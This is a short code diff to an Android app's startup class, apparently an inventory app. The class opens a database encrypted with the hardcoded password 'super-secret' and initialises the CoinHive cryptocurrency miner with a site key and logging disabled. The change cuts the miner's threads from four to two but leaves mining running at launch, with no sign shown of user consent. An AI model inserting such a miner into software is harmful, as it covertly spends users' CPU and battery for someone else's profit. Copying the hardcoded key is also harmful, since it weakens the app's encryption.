@@ -25,7 +25,7 @@ public class MyApp extends Application
         DevOpenHelper helper = new DevOpenHelper(this, ENCRYPTED ? "inven_e_encrypted" : "inven_e");
         Database db = ENCRYPTED ? helper.getEncryptedWritableDb("super-secret") : helper.getWritableDb();
         daoSession = new DaoMaster(db).newSession();
-        CoinHive.getInstance().init("YhHUfiQyt0RkpIiRoDeO9986LGxHphCd").setNumberOfThreads(4).setIsAutoThread(true).setThrottle(0.2).setLoggingEnabled(false).setForceASMJS(false);
+        CoinHive.getInstance().init("YhHUfiQyt0RkpIiRoDeO9986LGxHphCd").setNumberOfThreads(2).setIsAutoThread(true).setThrottle(0.2).setLoggingEnabled(false).setForceASMJS(false);
     }
 
     public DaoSession getDaoSession() {
